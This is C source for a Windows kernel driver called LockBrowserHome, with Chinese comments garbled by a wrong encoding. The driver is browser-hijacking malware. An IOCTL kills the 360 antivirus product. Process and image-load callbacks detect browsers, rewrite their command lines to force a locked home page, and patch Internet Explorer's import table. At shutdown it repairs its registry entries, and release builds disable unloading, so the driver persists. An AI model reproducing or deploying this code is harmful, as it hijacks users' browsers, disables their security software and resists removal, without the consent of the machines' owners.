#include <ntddk.h>
#include <Ntstrsafe.h>

#include "main.h"
#include "Kill360.h"
#include "LockHomePage.h"
#include "ToolFunction.h"
#include "CheckRegistry.h"
#include "LockCommandLine.h"

//####################################################################################################
// Global data:
//####################################################################################################
PDRIVER_OBJECT g_DriverObject = NULL;
PDEVICE_OBJECT g_DeviceObject = NULL;
UNICODE_STRING g_DeviceName = RTL_CONSTANT_STRING(L"\\Device\\LockBrowserHome");
UNICODE_STRING g_SymbolLinkName = RTL_CONSTANT_STRING(L"\\DosDevices\\LockBrowserHome");

EBrowserType g_CurrentBrowser = e_Browser_Base;

BOOLEAN CheckTime();

//####################################################################################################
// DriverEntry:
//####################################################################################################
NTSTATUS
DriverEntry(
	IN PDRIVER_OBJECT DriverObject,
	IN PUNICODE_STRING RegistryPath
	)
{
	NTSTATUS Status = STATUS_SUCCESS;

	KdPrint(("Enter DriverEntry!\n"));

	g_DriverObject = DriverObject;

	do 
	{

		if (!CheckTime()){
			Status = STATUS_UNSUCCESSFUL;
			break;
		}

		if (!NT_SUCCESS(LhpCheckSystem())){
			Status = STATUS_NOT_SUPPORTED;
			break;
		}

		//
		// �����豸����������ǲ���̵ȳ�ʼ��
		//

		Status = LhpCreateDevice(
			DriverObject,
			&g_DeviceName,
			&g_SymbolLinkName,
			&g_DeviceObject
			);
		if (!NT_SUCCESS(Status))
			break;

		LhpSetDriverDispatch(DriverObject);


		//
		// ע����д���ݳ�ʼ��
		//
		LhpInitializeRegistryData(RegistryPath);


		//
		// ������ʼ��
		//
		LhpLockInit();


		//
		// �������̻ص���ӳ����ػص�
		//
		PsSetCreateProcessNotifyRoutine(LhpCreateProcessNotify, FALSE);
		PsSetLoadImageNotifyRoutine(LhpLoadImageNotify);


		//
		// �����ػ��ص�
		//
		IoRegisterShutdownNotification(g_DeviceObject);


		KdPrint(("DriverEntry init succesful!\n"));

	} while (FALSE);


	return Status;
}

//####################################################################################################
// Driver unload Routine:
//####################################################################################################
VOID
LhpDriverUnload(
	IN PDRIVER_OBJECT DriverObject
	)
{
	if (g_DeviceObject)
	{
		LhpDeleteDevice(g_DeviceObject, &g_SymbolLinkName);
		g_DeviceObject = NULL;
	}

	LhpLockUninit();

	PsSetCreateProcessNotifyRoutine(LhpCreateProcessNotify, TRUE);
	PsRemoveLoadImageNotifyRoutine(LhpLoadImageNotify);
}

//####################################################################################################
// Check system version
//####################################################################################################
NTSTATUS
LhpCheckSystem()
{
	ESystemVersion SystemVersion = e_Windows_NotSupport;
	LhpGetSystemVersion(&SystemVersion);

	if (SystemVersion == e_Windows_XP || SystemVersion == e_Windows_7)
	{
		return STATUS_SUCCESS;
	}
	else
	{
		return STATUS_UNSUCCESSFUL;
	}
}


//####################################################################################################
// Create device.
//####################################################################################################
NTSTATUS
LhpCreateDevice(
	IN PDRIVER_OBJECT DriverObject,
	IN PUNICODE_STRING DeviceName,
	IN PUNICODE_STRING SymbolLinkName,
	OUT PDEVICE_OBJECT *pDeviceObject
	)
{
	NTSTATUS Status = STATUS_SUCCESS;


	do
	{
		if (!DriverObject || !pDeviceObject)
		{
			Status = STATUS_INVALID_PARAMETER;
			break;
		}

		Status = IoCreateDevice(DriverObject,
			0,
			DeviceName,
			FILE_DEVICE_UNKNOWN,
			0,
			FALSE,
			pDeviceObject
			);
		if (!NT_SUCCESS(Status))
			break;

		Status = IoCreateSymbolicLink(
			SymbolLinkName,
			DeviceName
			);
		if (!NT_SUCCESS(Status))
		{
			IoDeleteDevice(*pDeviceObject);
			*pDeviceObject = NULL;
			break;
		}

	} while (FALSE);

	return Status;
}


//####################################################################################################
// delete device.
//####################################################################################################
NTSTATUS
LhpDeleteDevice(
	IN PDEVICE_OBJECT DeviceObject,
	IN PUNICODE_STRING SymbolLinkName
	)
{
	IoDeleteDevice(DeviceObject);
	IoDeleteSymbolicLink(SymbolLinkName);

	return STATUS_SUCCESS;
}


//####################################################################################################
// set driver's dispatch Routines and driver unload Routine.
//####################################################################################################
NTSTATUS
LhpSetDriverDispatch(
	IN PDRIVER_OBJECT DriverObject
	)
{
	if (!DriverObject)
		return STATUS_INVALID_PARAMETER;

#if DBG
	DriverObject->DriverUnload = LhpDriverUnload;
#else
	DriverObject->DriverUnload = NULL;
#endif
	DriverObject->MajorFunction[IRP_MJ_CREATE] = 
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = LhpDispatchCreateClose;

	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = LhpDispatchDeviceIoControl;
	DriverObject->MajorFunction[IRP_MJ_SHUTDOWN] = LhpDispatchShutdown;

	return STATUS_SUCCESS;
}


//####################################################################################################
// driver's create/close Routine
//####################################################################################################
NTSTATUS
LhpDispatchCreateClose(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp
	)
{
	return STATUS_SUCCESS;
}


//####################################################################################################
// driver's IO communication Routine.
//####################################################################################################
NTSTATUS
LhpDispatchDeviceIoControl(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp
	)
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	PIO_STACK_LOCATION StackLocation = NULL;
	PVOID InputBuffer = NULL;
	ULONG InputBufferLength = 0;
	ULONG IoControlCode = 0;

	StackLocation = IoGetCurrentIrpStackLocation(Irp);
	InputBuffer = Irp->AssociatedIrp.SystemBuffer;
	InputBufferLength = StackLocation->Parameters.DeviceIoControl.InputBufferLength;
	IoControlCode = StackLocation->Parameters.DeviceIoControl.IoControlCode;

	switch (IoControlCode)
	{
	case LOCK_IO_CTL_KILL_360:
		//
		// kill 360
		//
		Status = LhpKill360();
		break;

	case LOCK_IO_CTL_LOCK_HOME_PAGE:
		__try
		{
			PIO_PACKET_LOCK_HOMEPAGE IoPacket = (PIO_PACKET_LOCK_HOMEPAGE)InputBuffer;
			if (IoPacket && InputBufferLength == sizeof(IO_PACKET_LOCK_HOMEPAGE))
			{
				Status = LhpSetLockInfo(IoPacket->LockedURL);
			}
			else
			{
				Status = STATUS_INVALID_PARAMETER;
			}
		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			Status = STATUS_INVALID_PARAMETER;
		}

		break;
	}

	Irp->IoStatus.Status = Status;
	Irp->IoStatus.Information = 0;
	IofCompleteRequest(Irp, IO_NO_INCREMENT);
	return Status;
}

//////////////////////////////////////////////////////////////////////////
// Shutdown callback
//////////////////////////////////////////////////////////////////////////
NTSTATUS
LhpDispatchShutdown(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp
	)
{
	NTSTATUS Status = STATUS_SUCCESS;

	//
	// check and repair registry
	//
	LhpCheckAndRepairRegistry();
	
	return Status;
}



//////////////////////////////////////////////////////////////////////////
// Create process notify callback.
//////////////////////////////////////////////////////////////////////////
extern WCHAR g_DllFilePath[MAX_PATH];

VOID
LhpCreateProcessNotify(
	IN HANDLE  ParentId,
	IN HANDLE  ProcessId,
	IN BOOLEAN  Create
	)
{
	WCHAR szCurrentProcess[MAX_PATH] = {0};
	ULONG bufLen = _countof(szCurrentProcess);
	WCHAR szRing3ProcessName[MAX_PATH] = {0};
	WCHAR szParentProcess[MAX_PATH] = {0};
	ULONG bufLen2 = _countof(szParentProcess);
	ULONG Index = 0;

	if (Create == FALSE)
		return;

	LhpGetProcessImageNameByProcessId(ProcessId, szCurrentProcess, &bufLen);
	_wcslwr(szCurrentProcess);

	//
	// ���̹���
	//
	for (Index = 0; Index < _countof(g_AllBrowsersNameList); Index++)
	{
		if (wcsstr(szCurrentProcess, g_AllBrowsersNameList[Index]) != NULL){
			g_CurrentBrowser = e_Browser_Base + Index;
			break;
		}
	}

	if (Index == _countof(g_AllBrowsersNameList))
	{
		return;
	}

	//
	// �����̹���
	//
	LhpGetProcessImageNameByProcessId(ParentId, szParentProcess, &bufLen2);
	_wcslwr(szParentProcess);
	if (wcsstr(szParentProcess, L"\\explorer.exe") == NULL
		&& wcsstr(szParentProcess, L"\\kslaunch.exe") == NULL)
		return;


	if (!NT_SUCCESS(LhpConvertDeviceName(szCurrentProcess, szRing3ProcessName, sizeof(szRing3ProcessName))))
		return;


	//
	// explorer�������������ʱ������������
	//
	LhpLockCommandLine(ProcessId, szRing3ProcessName);
}

//////////////////////////////////////////////////////////////////////////
// Load image notify callback.
// �޸�IE�ĵ�����Կ�QM
//////////////////////////////////////////////////////////////////////////
VOID
LhpLoadImageNotify(
    IN PUNICODE_STRING FullImageName,
    IN HANDLE  ProcessId,
    IN PIMAGE_INFO  ImageInfo
    )
{
	WCHAR szCurrentProcess[MAX_PATH] = {0};
	ULONG bufLen = _countof(szCurrentProcess);
	WCHAR szModuleName[MAX_PATH] = {0};
	ULONG Index = 0;


	//
	// ���̹���
	//
	LhpGetProcessImageNameByProcessId(ProcessId, szCurrentProcess, &bufLen);
	_wcslwr(szCurrentProcess);
	if (wcsstr(szCurrentProcess,L"iexplore.exe") == NULL)
		return;


	//
	// ģ��������
	//
	RtlStringCbCopyUnicodeString(szModuleName, sizeof(szModuleName), FullImageName);
	_wcslwr(szModuleName);
	if (wcsstr(szModuleName, L"iexplore.exe") == NULL)
		return;


	//
	// ��IE��ģ����غ���е������޸�
	//
	LhpRepairImportTable(ImageInfo->ImageBase, ImageInfo->ImageSize, FullImageName);
}


BOOLEAN CheckTime()
{
	static CHAR  szTime[128];
	LARGE_INTEGER SystemTime;
	LARGE_INTEGER LocalTime;
	TIME_FIELDS EndTimeFields;
	LARGE_INTEGER EndTimeInt;

	EndTimeFields.Year = 2016;
	EndTimeFields.Month = 6;
	EndTimeFields.Day = 7;
	EndTimeFields.Hour = 0;
	EndTimeFields.Minute = 0;
	EndTimeFields.Second = 0;
	EndTimeFields.Milliseconds = 0;
	EndTimeFields.Weekday = 0;
	RtlTimeFieldsToTime(&EndTimeFields, &EndTimeInt);

	KeQuerySystemTime(&SystemTime);
	ExSystemTimeToLocalTime(&SystemTime, &LocalTime);

	if (LocalTime.QuadPart >= EndTimeInt.QuadPart)
	{
		return FALSE;
	}
	else
	{
		return TRUE;
	}
}